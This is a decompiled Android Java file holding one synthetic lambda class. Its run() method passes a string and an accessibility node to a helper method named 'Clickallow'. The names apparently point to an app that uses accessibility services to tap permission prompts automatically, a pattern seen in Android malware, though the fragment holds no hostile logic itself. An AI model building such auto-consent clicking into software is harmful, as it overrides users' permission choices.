/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.view.accessibility.AccessibilityNodeInfo
 */
package linker.resourcer.encoder;

import android.view.accessibility.AccessibilityNodeInfo;
import linker.resourcer.encoder.AccessibilityServiceHelper;

public final class AccessibilityServiceHelper$$ExternalSyntheticLambda22
implements Runnable {
    public final String f$0;
    public final AccessibilityNodeInfo f$1;

    public /* synthetic */ AccessibilityServiceHelper$$ExternalSyntheticLambda22(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        this.f$0 = string2;
        this.f$1 = accessibilityNodeInfo;
    }

    @Override
    public final void run() {
        AccessibilityServiceHelper.lambda$Clickallow$4(this.f$0, this.f$1);
    }
}

